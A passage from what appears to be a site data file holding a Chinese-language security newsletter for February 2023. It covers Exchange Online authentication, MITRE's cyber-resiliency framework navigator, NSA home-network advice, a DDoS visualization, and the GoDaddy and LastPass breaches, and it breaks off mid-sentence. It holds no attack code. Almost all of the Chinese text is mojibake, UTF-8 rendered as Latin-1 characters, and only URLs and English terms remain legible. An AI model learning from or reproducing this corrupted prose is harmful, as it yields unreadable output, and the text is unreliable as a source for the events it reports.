·çš„å®‰å…¨æ–¹æ³•ï¼Œæç¤ºç”µå­é‚®ä»¶åº”ç”¨ç¨‹åºå·²æ˜æ–‡å½¢å¼å‘é€åŸŸå‡­æ®ã€‚\r\n\r\nè™½ç„¶å®ƒæå¤§åœ°ç®€åŒ–äº†èº«ä»½éªŒè¯è¿‡ç¨‹ï¼Œä½†åŸºæœ¬èº«ä»½éªŒè¯è¿˜ä½¿æ”»å‡»è€…åœ¨æœªä½¿ç”¨ä¼ è¾“å±‚å®‰å…¨ (TLS) åŠ å¯†åè®®ä¿æŠ¤è¿æ¥æ—¶æ›´å®¹æ˜“çªƒå–å‡­æ®ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œåœ¨ä½¿ç”¨åŸºæœ¬èº«ä»½éªŒè¯æ—¶å¯ç”¨å¤šå› ç´ èº«ä»½éªŒè¯ (MFA) å¹¶ä¸å®¹æ˜“;å› æ­¤ï¼Œé€šå¸¸å®ƒæ ¹æœ¬ä¸è¢«ä½¿ç”¨ã€‚\r\n\r\nç°ä»£èº«ä»½éªŒè¯(Active Directory èº«ä»½éªŒè¯åº“ (ADAL) å’ŒåŸºäº OAuth 2.0 ä»¤ç‰Œçš„èº«ä»½éªŒè¯)å…è®¸åº”ç”¨ç¨‹åºä½¿ç”¨ OAuth è®¿é—®çš„ç”Ÿå‘½å‘¨æœŸæ˜¯æœ‰é™çš„ï¼Œå¹¶ä¸”ä¸èƒ½é‡å¤ç”¨äºä¸ºå…¶æä¾›çš„èµ„æºä¹‹å¤–çš„å…¶ä»–èµ„æºè¿›è¡Œèº«ä»½éªŒè¯ã€‚\r\n\r\nå¼€å¯ç°ä»£èº«ä»½éªŒè¯åï¼Œå¯ç”¨å’Œå¼ºåˆ¶æ‰§è¡Œ MFA å°†å˜å¾—æ›´åŠ ç®€å•ï¼Œç›´æ¥å¿«é€Ÿæ˜¯æé«˜ Exchange Online ä¸­çš„æ•°æ®å®‰å…¨æ€§ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://techcommunity.microsoft.com/t5/exchange-team-blog/basic-authentication-deprecation-in-exchange-online-september/ba-p/3609437\r\n"},{"fields":{"slug":"/å®‰å…¨é€šè®¯ Security.News/Security.News@202302/","title":"Security.News@202302"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202302\r\ntags:\r\n  - å®‰å…¨é€šè®¯ Security.News\r\n  - å®‰å…¨äº‹ä»¶\r\n  - å®‰å…¨å¯è§†åŒ–\r\n  - å®‰å…¨æ¡†æ¶\r\n  - æœ€ä½³å®è·µ\r\n  - å®‰å…¨æŠ¥å‘Š\r\n  - NSA\r\n  - MITRE\r\n  - netscout\r\n  - Coinbaseé­å—é’“é±¼æ”»å‡»ï¼Œä½†è¢«æˆåŠŸé˜»æ­¢\r\n  - Godaddy\r\n  - Lastpass\r\n  - å¼€æº\r\n  - Synopsys\r\n---\r\n\r\n## å®‰å…¨æ¡†æ¶\r\n### MITRE å‘å¸ƒç½‘ç»œå¼¹æ€§å·¥ç¨‹ï¼ˆCyber Resiliency Engineering Frameworkï¼‰æ¡†æ¶å¯¼èˆªå™¨\r\n2021å¹´çš„RSACå¤§ä¼šçš„ä¸»é¢˜æ˜¯â€œResilienceâ€ï¼Œæƒ³è®¨è®ºçš„æ¦‚å¿µæ˜¯ï¼šå®ç°100%çš„é˜²æŠ¤ä¸ä»…ä¸ç°å®ï¼Œè¿˜ä¼šå¯¼è‡´é”™è¯¯çš„å®‰å…¨æ„Ÿã€‚å¿…é¡»è€ƒè™‘åœ¨é˜²æŠ¤å¤±æ•ˆçš„æƒ…å†µä¸‹å¦‚ä½•ç¡®ä¿ç³»ç»Ÿå®‰å…¨å¹¶å¿«é€Ÿæ¢å¤ã€‚ \r\n\r\n2011å¹´MITREå°±æå‡ºäº†Cyber Resiliency Engineering Frameworkçš„æ¦‚å¿µï¼Œæ•´ä¸ªæ¡†æ¶ä»¥é£é™©ç®¡ç†ä¸ºå¯¼å‘ï¼Œæ˜ç¡®ç½‘ç»œå¼¹æ€§çš„ç›®çš„ï¼ˆgoalï¼‰ï¼Œå¹¶é€å±‚åˆ†è§£ä¸ºä¸€ç³»åˆ—ç›®æ ‡ï¼ˆobjectï¼‰ã€å­ç›®æ ‡ã€æ´»åŠ¨/èƒ½åŠ›ã€‚ç„¶ååœ¨æˆ˜ç•¥è®¾è®¡åŸåˆ™å’Œè½åœ°çš„ç»“æ„è®¾è®¡åŸåˆ™çš„æŒ‡å¼•ä¸‹ï¼Œé’ˆå¯¹æ¯ä¸ªæ´»åŠ¨/èƒ½åŠ›é€‰å–ç›¸é€‚åº”çš„æŠ€å·§ï¼ˆtechniqueï¼‰åŠå…¶é…å¥—çš„æ–¹æ³•ï¼ˆapprochï¼‰ã€‚æœ€åå¯¹æ¯ä¸ªæ´»åŠ¨/èƒ½åŠ›çš„å®ç°æ•ˆæœæŒ‰ç…§é€‰å®šçš„æŒ‡æ ‡é›†åˆè¿›è¡Œæœ‰æ•ˆæ€§åº¦é‡ï¼ˆMOEï¼‰å’Œè¯„åˆ†ã€‚\r\n\r\nå…¶ä¸­çš„æŒ‡æ ‡è®¾è®¡ä¹Ÿæœ‰ç‚¹æ„æ€ï¼Œæå‡ºäº†ä¸€ä¸ªåŸºäºæ”»é˜²å¯¹æŠ—çš„å¯è§‚æµ‹å¯¹è±¡ï¼ˆåŠŸèƒ½é¡¹å’Œæ€§èƒ½é¡¹ï¼‰æ—¶åºå›¾ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œå›¾ä¸­çº¢è‰²æ˜¯æ”»å‡»è§†è§’ï¼Œé‡‡ç”¨äº†æ”»å‡»é“¾æ¨¡å‹ï¼›è“è‰²æ˜¯é˜²å®ˆè§†è§’ï¼Œåˆ†ä¸ºäº†PDRRå››ä¸ªç¯èŠ‚ï¼Œåœ¨æ•°æ®ç ´åè¿™ä¸ªåœºæ™¯ä¸‹ï¼ŒåŠŸèƒ½å’Œæ€§èƒ½ä¼šæ˜¾è‘—ä¸‹é™ï¼Œè€Œåœ¨æ•°æ®å¤–æ³„ä¸‹å°±æ²¡ä»€ä¹ˆå˜åŒ–ã€‚\r\n\r\n![AWpoDz](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/AWpoDz.jpg)\r\n\r\nåŸºäºæ—¶åºå›¾ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬é’ˆå¯¹CREFä¸­çš„æ¯ä¸ªæ´»åŠ¨è®¾è®¡å‡ºç›¸åº”çš„ç½‘ç»œå¼¹æ€§æŒ‡æ ‡ã€‚\r\n\r\nMITREä¹Ÿå‘å¸ƒäº†å¯è§†åŒ–çš„CREFå·¥å…·ï¼Œå¹¶ä¸ATT&CKå…³è”èµ·æ¥äº†ï¼Œé“¾æ¥è§å‚è€ƒèµ„æ–™äºŒã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.darkreading.com/dr-tech/mitre-releases-tool-to-design-cyber-resilient-systems\r\n- https://crefnavigator.mitre.org/navigator\r\n\r\n## æœ€ä½³å®è·µ\r\n### NSA åˆ†äº«æœ‰å…³å¦‚ä½•ä¿æŠ¤æ‚¨çš„å®¶åº­ç½‘ç»œçš„æœ€ä½³å®è·µæŒ‡å—\r\nç¾å›½å›½å®¶å®‰å…¨å±€ (NSA) å·²å‘å¸ƒæŒ‡å—ï¼Œä»¥å¸®åŠ©è¿œç¨‹å·¥ä½œè€…ä¿æŠ¤ä»–ä»¬çš„å®¶åº­ç½‘ç»œå¹¶ä¿æŠ¤ä»–ä»¬çš„è®¾å¤‡å…å—æ”»å‡»ã€‚\r\n\r\nå›½é˜²éƒ¨æƒ…æŠ¥æœºæ„å‘¨ä¸‰å‘å¸ƒçš„æŒ‡å—åŒ…æ‹¬ä¸€é•¿ä¸²å»ºè®®ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€å°æ®µè¦ç‚¹ï¼Œæ•¦ä¿ƒè¿œç¨‹å·¥ä½œäººå‘˜ç¡®ä¿ä»–ä»¬çš„è®¾å¤‡å’Œè½¯ä»¶æ˜¯æœ€æ–°çš„ã€‚\r\n\r\nè¿˜å»ºè®®è¿œç¨‹å·¥ä½œäººå‘˜å®šæœŸå¤‡ä»½ä»–ä»¬çš„æ•°æ®ä»¥é˜²æ­¢æ•°æ®ä¸¢å¤±ï¼Œå¹¶æ–­å¼€ä»–ä»¬ä¸ä½¿ç”¨çš„è®¾å¤‡ï¼Œå¦‚æœå®ƒä»¬ä¸éœ€è¦å§‹ç»ˆä¿æŒæ´»è·ƒçš„äº’è”ç½‘è¿æ¥çš„è¯ã€‚\r\n\r\nè¦åœ¨æ‚¨çš„å…¶ä¸­ä¸€å°è®¾å¤‡è¢«æ„ŸæŸ“æ—¶åˆ é™¤éæŒä¹…æ€§æ¶æ„è½¯ä»¶ï¼Œæ‚¨è¿˜åº”è¯¥ç»å¸¸é‡æ–°å¯åŠ¨å®ƒä»¬æˆ–å®‰æ’é‡æ–°å¯åŠ¨ä»¥è¿›ä¸€æ­¥é™ä½è¿™ç§é£é™©ã€‚\r\n\r\nâ€œè‡³å°‘ï¼Œä½ åº”è¯¥å®‰æ’æ¯å‘¨é‡æ–°å¯åŠ¨ä½ çš„è·¯ç”±è®¾å¤‡ã€æ™ºèƒ½æ‰‹æœºå’Œè®¡ç®—æœºã€‚å®šæœŸé‡æ–°å¯åŠ¨æœ‰åŠ©äºç§»é™¤æ¤å…¥ç‰©å¹¶ç¡®ä¿å®‰å…¨ï¼Œâ€ç¾å›½å›½å®¶å®‰å…¨å±€è¯´ã€‚\r\n\r\nå…¶ä»–æœ€ä½³åšæ³•åŒ…æ‹¬åœ¨æ‚¨çš„è®¡ç®—æœºä¸Šä½¿ç”¨éç‰¹æƒç”¨æˆ·å¸æˆ·ï¼Œå°½å¯èƒ½å¯ç”¨è‡ªåŠ¨æ›´æ–°ï¼Œä»¥åŠåœ¨ä¸ä½¿ç”¨ç½‘ç»œæ‘„åƒå¤´å’Œéº¦å…‹é£æ—¶ç¦ç”¨å®ƒä»¬ä»¥é˜»æ­¢é€šè¿‡å—æŸè®¾å¤‡æˆ–æ¶æ„è½¯ä»¶è¿›è¡Œçš„çªƒå¬ä¼å›¾ã€‚\r\n\r\n![cXrd4s](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/cXrd4s.jpg)\r\n#### å‚è€ƒèµ„æ–™\r\n- https://media.defense.gov/2023/Feb/22/2003165170/-1/-1/0/CSI_BEST_PRACTICES_FOR_SECURING_YOUR_HOME_NETWORK.PDF\r\n\r\n## å®‰å…¨å¯è§†åŒ–\r\n### netscoutçš„DDoSæ”»å‡»å‘é‡å¯è§†åŒ–æŒºæœ‰æ„æ€\r\nä½¿ç”¨ç±»ä¼¼å…ƒç´ å‘¨æœŸè¡¨çš„å½¢å¼æ¥åšå¯è§†åŒ–ï¼Œçœ‹èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°å’Œèˆ’æœçš„ï¼Œä¸è¿‡åœ¨ä¸­æ–‡ç¯å¢ƒå¯èƒ½æœ‰äº›æ°´åœŸä¸æœï¼Œè§ï¼š\r\n![3TLCtg](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/3TLCtg.jpg)\r\n\r\nå¾®è½¯çš„å¨èƒæŠ¥å‘Šä¸­ä¹Ÿæ›¾ä½¿ç”¨è¿‡ç±»ä¼¼çš„å½¢å¼ï¼š\r\n![Zyznvr](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/Zyznvr.jpg)\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.netscout.com/threatreport/ddos-attack-vectors/\r\n- https://twitter.com/fr0gger_/status/1627203918412537857\r\n\r\n\r\n## å®‰å…¨äº‹ä»¶\r\n### GoDaddy æŠ«éœ²äº†å­˜åœ¨å¤šå¹´çš„å®‰å…¨æ¼æ´ï¼Œå¯¼è‡´å®¢æˆ·å’Œå‘˜å·¥ç™»å½•å‡­è¯æ³„æ¼ã€æœåŠ¡å™¨è¢«å®‰è£…æ¶æ„è½¯ä»¶ã€å¹¶æœ‰æºä»£ç è¢«ç›—çªƒ\r\n\r\n2023å¹´2æœˆ16æ—¥ï¼Œç½‘ç»œæ‰˜ç®¡å·¨å¤´ GoDaddy è¡¨ç¤ºå…¶é­å—äº†é»‘å®¢æ”»å‡»ï¼Œåœ¨å¤šå¹´çš„æ”»å‡»ä¸­ï¼ŒcPanelè¢«æ‹¿ä¸‹ï¼Œå¯¼è‡´å®¢æˆ·å’Œå‘˜å·¥ç™»å½•å‡­è¯æ³„æ¼ã€æœåŠ¡å™¨è¢«å®‰è£…æ¶æ„è½¯ä»¶ã€å¹¶æœ‰æºä»£ç è¢«ç›—çªƒï¼›GoDaddyæ—©åœ¨2022å¹´12æœˆå°±è¢«å®¢æˆ·å‘ŠçŸ¥ä»–ä»¬çš„ç½‘ç«™ä¼šé‡å®šå‘åˆ°éšæœºåŸŸåï¼Œåœ¨è°ƒæŸ¥ä¸­å‘ç°ï¼Œæ”»å‡»è€…åœ¨2019å¹´åˆ°2022å¹´ä¸­æœ‰å››æ¬¡è¢«å‘ç°ï¼Œä½†ä¸€ç›´æ²¡æœ‰å¤±å»è®¿é—®æƒé™ã€‚\r\n\r\nâ€œæ ¹æ®æˆ‘ä»¬çš„è°ƒæŸ¥ï¼Œæˆ‘ä»¬è®¤ä¸ºè¿™äº›äº‹ä»¶æ˜¯ä¸€ä¸ªå¤æ‚çš„å¨èƒè¡Œä¸ºè€…ç»„ç»‡å¤šå¹´æ´»åŠ¨çš„ä¸€éƒ¨åˆ†ï¼Œè¯¥ç»„ç»‡é™¤å…¶ä»–å¤–ï¼Œåœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¸Šå®‰è£…äº†æ¶æ„è½¯ä»¶å¹¶è·å–äº†ä¸ GoDaddy å†…æŸäº›æœåŠ¡ç›¸å…³çš„ä»£ç ç‰‡æ®µï¼Œâ€æ‰˜ç®¡å…¬å¸åœ¨æäº¤ç»™ç¾å›½è¯åˆ¸äº¤æ˜“å§”å‘˜ä¼šçš„[æ–‡ä»¶](https://d18rn0p25nwr6d.cloudfront.net/CIK-0001609711/e4736ddb-b4c7-485b-a8fc-1827691692c9.pdf)ä¸­è¯´ã€‚\r\n\r\nTwitterä¸Šæœ‰äººçˆ†æ–™è¯´æ˜¯å†…é¬¼å¯¼è‡´çš„ï¼š\r\n\r\n![Twitterä¼ é—»](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/SiNKd9.png)\r\n\r\n![Twitterä¼ é—»](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/Vobcnx.png)\r\n\r\nè€Œæ”»å‡»è€…çš„ç›®çš„ï¼Œå¯èƒ½æ˜¯**åˆ©ç”¨Godaddyä½œä¸ºè·³æ¿ï¼Œä»¥è¿›è¡Œç½‘ç»œé’“é±¼æ´»åŠ¨ã€æ¶æ„è½¯ä»¶åˆ†å‘å’Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚**\r\n\r\n#### é™„ï¼šGodaddyå®‰å…¨äº‹ä»¶æ—¶é—´çº¿\r\n\r\n- 2020å¹´3æœˆï¼Œæ”»å‡»è€…è·å¾—äº†ç™»å½•å‡­æ®å¹¶è®¿é—®äº†æ•°é‡æœ‰é™çš„å‘˜å·¥è´¦æˆ·å’Œå±äºå¤§çº¦ 28000 åå®¢æˆ·çš„æ‰˜ç®¡è´¦æˆ·ã€‚\r\n- 2020å¹´4æœˆï¼ŒGoDaddy çš„ä¸€åå‘˜å·¥è¢«é»‘å®¢æ§åˆ¶ï¼Œå¯¼è‡´Escrow.comè¢«å…¥ä¾µã€‚\r\n- 2020å¹´1æœˆï¼ŒGoDaddy çš„å‘˜å·¥è¢«é»‘å®¢è¯±éª—ä¿®æ”¹äº†è‡³å°‘ä¸¤ä¸ªåŠ å¯†è´§å¸ç½‘ç«™çš„ DNS è®¾ç½®ã€‚\r\n- 2021å¹´9æœˆï¼Œæ”»å‡»è€…è·å¾—äº† 120 ä¸‡ä¸ªå½“å‰ä¸æ´»è·ƒçš„æ‰˜ç®¡ WordPress ç”¨æˆ·çš„ WordPress ç®¡ç†å‘˜å¸æˆ·ã€ç”µå­é‚®ä»¶åœ°å€å’Œ FTP å¸æˆ·çš„ç™»å½•å‡­æ®ã€‚ GoDaddy äº 2021 å¹´ 11 æœˆæ­£å¼æŠ«éœ²äº†è¯¥æ¼æ´ã€‚\r\n- 2021å¹´11æœˆï¼Œæ”»å‡»è€…è·å¾—äº†å¯ä»¥è®¿é—® GoDaddy çš„æ‰˜ç®¡ WordPress æœåŠ¡æºä»£ç ã€‚\r\n- 2022å¹´12æœˆï¼Œæ”»å‡»è€…è·å¾—äº† cPanel æ‰˜ç®¡æœåŠ¡å™¨çš„æƒé™ã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> æ”»å‡»è€…æœ‰ä¸€å®šçš„åä¾¦æŸ¥èƒ½åŠ›ï¼Œæ¯”å¦‚ï¼šæœ‰å®¢æˆ·åé¦ˆGoDaddyçš„ç½‘ç«™ä¼šé‡å®šå‘åˆ°éšæœºåŸŸåï¼Œä½†Godaddyè‡ªå·±èƒ½éš¾å¤ç°è¯¥é—®é¢˜\r\n> \r\n> 2020å¹´å°±å‘ç°äº†ç³»ç»Ÿè¢«å…¥ä¾µï¼Œç›´åˆ°2023å¹´è¿˜æœªè§£å†³ï¼ˆæ”»å‡»è€…ä¸€ç›´æœ‰æƒé™ï¼‰ï¼Œæ˜¯APTçš„æ‰‹æ³•é«˜çº§/éšè”½ï¼Œè¿˜æ˜¯Godaddyçš„å®‰å…¨èƒ½åŠ›ä¸è¶³å‘¢ï¼Ÿ\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.computing.co.uk/news/4074669/godaddy-realised-security-breach\r\n- https://www.hackread.com/hackers-godaddy-source-code-data-breach/\r\n- https://aboutus.godaddy.net/newsroom/company-news/news-details/2023/Statement-on-recent-website-redirect-issues/default.aspx\r\n\r\n### LastPassç”¨æˆ·æ•°æ®é­çªƒï¼šå…³é”®è¿ç»´å‘˜å·¥é­å®šå‘æ”»å‡»ï¼Œå†…éƒ¨å®‰å…¨æ§åˆ¶å¤±æ•ˆ\r\n2023å¹´2æœˆ28æ—¥ï¼ŒLastPassæ—¥å‰å…¬å¸ƒäº†å»å¹´é­å—â€œäºŒæ¬¡ååŒæ”»å‡»â€äº‹ä»¶çš„æ›´å¤šä¿¡æ¯ï¼Œå‘ç°æ¶æ„é»‘å®¢æ½œä¼åœ¨å…¶å†…ç½‘é•¿è¾¾ä¸¤ä¸ªæœˆçš„æ—¶é—´å†…ï¼ŒæŒç»­è®¿é—®å¹¶çªƒå–äº†äºšé©¬é€ŠAWSäº‘å­˜å‚¨ä¸­çš„æ•°æ®ã€‚\r\n\r\nLastPassåœ¨å»å¹´12æœˆé€éœ²ï¼Œæ¶æ„é»‘å®¢çªƒå–åˆ°éƒ¨åˆ†åŠ å¯†çš„å¯†ç ä¿é™©åº“æ•°æ®å’Œå®¢æˆ·ä¿¡æ¯ã€‚ç°åœ¨ï¼Œè¯¥å…¬å¸è¿›ä¸€æ­¥è§£é‡Šäº†æ¶æ„é»‘å®¢çš„æ”»å‡»å®æ–½æ–¹æ³•ï¼Œç§°å¯¹æ–¹ä½¿ç”¨åˆ°äº†å»å¹´8æœˆé¦–æ¬¡å…¥ä¾µæ—¶çªƒå–çš„ä¿¡æ¯ï¼Œè¿˜åˆ©ç”¨ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œåœ¨ä¸€åé«˜çº§DevOpså·¥ç¨‹å¸ˆçš„è®¡ç®—æœºä¸Šå®‰è£…äº†é”®ç›˜è®°å½•å™¨ã€‚\r\n\r\nLastPassè¡¨ç¤ºï¼ŒäºŒæ¬¡ååŒæ”»å‡»åˆ©ç”¨åˆ°äº†é¦–è½®è¿è§„ä¸­å¤–æ³„çš„æ•°æ®ï¼Œå¹¶è®¿é—®äº†è¯¥å…¬å¸ç»è¿‡åŠ å¯†çš„Amazon S3å­˜å‚¨æ¡¶ã€‚\r\n\r\nLastPasså…¬å¸åªæœ‰4ä½DevOpså·¥ç¨‹å¸ˆæœ‰æƒè®¿é—®è¿™äº›è§£å¯†å¯†é’¥ï¼Œå› æ­¤æ¶æ„é»‘å®¢å°†çŸ›å¤´æŒ‡å‘äº†å…¶ä¸­ä¸€åå·¥ç¨‹å¸ˆã€‚æœ€ç»ˆï¼Œé»‘å®¢åˆ©ç”¨ç¬¬ä¸‰æ–¹åª’ä½“è½¯ä»¶åŒ…ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œåœ¨è¯¥å‘˜å·¥çš„è®¾å¤‡ä¸ŠæˆåŠŸå®‰è£…äº†é”®ç›˜è®°å½•å™¨ã€‚\r\n\r\n â€œæ¶æ„é»‘å®¢æˆåŠŸè·å–äº†å‘˜å·¥åœ¨å®Œæˆå¤šå› ç´ èº«ä»½éªŒè¯ï¼ˆMFAï¼‰åè¾“å…¥çš„ä¸»å¯†ç ï¼ˆmaster passwordï¼‰ï¼Œå€Ÿæ­¤è·å¾—äº†è¯¥DevOpså·¥ç¨‹å¸ˆå¯¹LastPassä¼ä¸šå¯†ç ä¿é™©åº“çš„è®¿é—®æƒã€‚â€LastPassæ—¥å‰å‘å¸ƒçš„æœ€æ–°å®‰å…¨è­¦å‘Šç§°ã€‚\r\n\r\nâ€œæ¶æ„é»‘å®¢éšåå¯¼å‡ºäº†å…±äº«æ–‡ä»¶å¤¹ä¸­çš„æœ¬åœ°ä¼ä¸šå¯†ç ä¿é™©åº“æ¡ç›®å’Œå†…å®¹ï¼Œå…¶ä¸­åŒ…æ‹¬èƒ½å¤Ÿè®¿é—®LastPass AWS S3ç”Ÿäº§å¤‡ä»½ã€å…¶ä»–äº‘å­˜å‚¨èµ„æºä»¥åŠéƒ¨åˆ†ç›¸å…³é‡è¦æ•°æ®åº“å¤‡ä»½çš„å®‰å…¨æ³¨é‡Šå’ŒåŠ å¯†å¯†é’¥ã€‚â€\r\n\r\nç”±äºæ¶æ„é»‘å®¢çªƒå–å¹¶ä½¿ç”¨äº†æœ‰æ•ˆçš„è®¿é—®å‡­è¯ï¼ŒLastPassçš„è°ƒæŸ¥äººå‘˜å¾ˆéš¾æ£€æµ‹åˆ°å¯¹æ–¹æ´»åŠ¨ï¼Œå¯¼è‡´å…¶é¡ºåˆ©ä»LastPassçš„äº‘å­˜å‚¨æœåŠ¡å™¨å¤„è®¿é—®å¹¶çªƒå–åˆ°å¤§é‡æ•°æ®ã€‚æ¶æ„é»‘å®¢ç”šè‡³æŒç»­é©»ç•™è¾¾ä¸¤ä¸ªæœˆä»¥ä¸Šï¼Œä»2022å¹´8æœˆ12æ—¥ä¸€ç›´åˆ°2022å¹´10æœˆ26æ—¥ã€‚\r\n\r\nç›´åˆ°æ¶æ„é»‘å®¢å°è¯•ç”¨äº‘èº«ä»½å’Œè®¿é—®ç®¡ç†ï¼ˆIAMï¼‰è§’è‰²æ‰§è¡Œæœªæˆæƒæ“ä½œæ—¶ï¼ŒLastPassæ‰æœ€ç»ˆé€šè¿‡AWS GuardDutyè­¦æŠ¥æ£€æµ‹åˆ°è¿™äº›å¼‚å¸¸è¡Œä¸ºã€‚\r\n\r\nè¯¥å…¬å¸è¡¨ç¤ºï¼Œä»–ä»¬å·²ç»æ›´æ–°äº†å®‰å…¨æœºåˆ¶ï¼ŒåŒ…æ‹¬å¯¹æ•æ„Ÿå‡­è¯åŠèº«ä»½éªŒè¯å¯†é’¥/ä»¤ç‰Œè¿›è¡Œè½®æ¢ã€æ’¤é”€è¯ä¹¦ã€æ·»åŠ å…¶ä»–è®°å½•ä¸è­¦æŠ¥ï¼Œä»¥åŠæ‰§è¡Œæ›´ä¸¥æ ¼çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚\r\n\r\n#### å¤§é‡æ•°æ®å·²è¢«è®¿é—®\r\n\r\nä½œä¸ºæ­¤æ¬¡æŠ«éœ²çš„ä¸€éƒ¨åˆ†ï¼ŒLastPassè¿˜å‘å¸ƒäº†å…³äºæ”»å‡»ä¸­å“ªäº›å®¢æˆ·ä¿¡æ¯é­åˆ°çªƒå–çš„å…·ä½“è¯´æ˜ã€‚\r\n\r\næ ¹æ®ç‰¹å®šå®¢æˆ·çš„ä¸åŒï¼Œå¤±çªƒæ•°æ®çš„èŒƒå›´å¾ˆå¹¿ä¸”å†…å®¹å¤šæ ·ï¼ŒåŒ…æ‹¬å¤šå› ç´ èº«ä»½éªŒè¯ï¼ˆMFAï¼‰ç§å­å€¼ã€MFA APIé›†æˆsecreetï¼Œä»¥åŠä¸ºè”åˆä¼ä¸šå®¢æˆ·æä¾›çš„Split Knowledgeç»„ä»¶ï¼ˆK2ï¼‰å¯†é’¥ã€‚\r\n\r\nä»¥ä¸‹æ˜¯è¢«ç›—æ•°æ®å†…å®¹çš„åŸºæœ¬æ¦‚æ‹¬ï¼Œæ›´è¯¦ç»†çš„å¤±çªƒä¿¡æ¯è¯´æ˜è¯·å‚é˜…LastPassæ”¯æŒé¡µé¢ï¼ˆhttps://support.lastpass.com/help/what-data-was-accessedï¼‰ã€‚\r\n\r\n#### äº‹ä»¶1ä¸­è¢«è®¿é—®çš„æ•°æ®æ±‡æ€»\r\n- äº‘ç«¯æŒ‰éœ€å¼€å‘å’Œæºä»£ç ä»“åº“â€”â€”åŒ…æ‹¬å…¨éƒ¨200ä¸ªè½¯ä»¶ä»£ç ä»“åº“ä¸­çš„14ä¸ªã€‚\r\n- æ¥è‡ªå„ä»£ç ä»“åº“çš„å†…éƒ¨è„šæœ¬â€”â€”å…¶ä¸­åŒ…å«LastPass secretså’Œè¯ä¹¦ã€‚\r\n- å†…éƒ¨æ–‡æ¡£â€”â€”æè¿°å¼€å‘ç¯å¢ƒè¿ä½œæ–¹å¼çš„æŠ€æœ¯ä¿¡æ¯ã€‚\r\n\r\n#### äº‹ä»¶2ä¸­è¢«è®¿é—®çš„æ•°æ®æ±‡æ€»\r\nDevOps secretsâ€”â€”ç”¨äºè®¿é—®æˆ‘ä»¬äº‘ç«¯å¤‡ä»½å­˜å‚¨çš„å—ä¿æŠ¤secretsã€‚\r\n\r\näº‘å¤‡ä»½å­˜å‚¨â€”â€”åŒ…å«é…ç½®æ•°æ®API secretsã€ç¬¬ä¸‰æ–¹é›†æˆsecretså®¢æˆ·å…ƒæ•°æ®ï¼Œä»¥åŠæ‰€æœ‰å®¢æˆ·ä¿é™©åº“æ•°æ®çš„å¤‡ä»½ã€‚é™¤URLã€ç”¨äºå®‰è£…LastPass Windows/macOSç‰ˆè½¯ä»¶ä»¥åŠæ¶‰åŠé‚®ä»¶åœ°å€çš„ç‰¹å®šç”¨ä¾‹ä¹‹å¤–ï¼Œå…¨éƒ¨æ•æ„Ÿå®¢æˆ·ä¿é™©åº“æ•°æ®å‡é€šè¿‡â€œé›¶çŸ¥è¯†æ¶æ„â€è¿›è¡ŒåŠ å¯†ï¼Œä¸”åªèƒ½é€šè¿‡å„ç”¨æˆ·ä¸»å¯†ç æä¾›çš„å”¯ä¸€åŠ å¯†å¯†é’¥å®ç°è§£å¯†ã€‚è¯·æ³¨æ„ï¼ŒLastPassæ°¸è¿œä¸ä¼šè·å–æœ€ç»ˆç”¨æˆ·çš„ä¸»å¯†ç ï¼Œä¹Ÿä¸ä¼šå­˜å‚¨æˆ–æŒæœ‰ä¸»å¯†ç â€”â€”å› æ­¤ï¼Œæ³„éœ²æ•°æ®ä¸­ä¸æ¶‰åŠä»»ä½•ä¸»å¯†ç ã€‚\r\n\r\nLastPass MFA/è”é‚¦æ•°æ®åº“å¤‡ä»½â€”â€”åŒ…å«LastPass Authenticatorçš„ç§å­å€¼å‰¯æœ¬ï¼Œä½œä¸ºMFAå¤‡ä»½é€‰é¡¹ï¼ˆå¦‚æœå¯ç”¨ï¼‰çš„ç”µè¯å·ç ï¼Œä»¥åŠä¾›LastPassè”é‚¦æ•°æ®åº“ï¼ˆå¦‚æœå¯ç”¨ï¼‰ä½¿ç”¨çš„Split Knowledgeç»„ä»¶ï¼ˆå³K2ã€Œå¯†é’¥ã€ï¼‰ã€‚è¯¥æ•°æ®åº“ç»è¿‡åŠ å¯†ï¼Œä½†åœ¨ç¬¬äºŒæ¬¡è¿è§„äº‹ä»¶ä¸­ï¼Œæ¶æ„é»‘å®¢çªƒå–äº†å•ç‹¬å­˜å‚¨çš„è§£å¯†å¯†é’¥ã€‚\r\n\r\næœ¬æ¬¡å‘å¸ƒçš„æ”¯æŒå…¬å‘Šè¿˜ç›¸å½“â€œéšè”½â€ï¼Œç”±äºLastPasså…¬å¸åœ¨å…¬å‘Šé¡µé¢çš„HTMLæ ‡ç­¾æ·»åŠ äº†`<meta name=\"robots\" content=\"noindex\">`ï¼Œå› æ­¤è¯¥é¡µé¢æ— 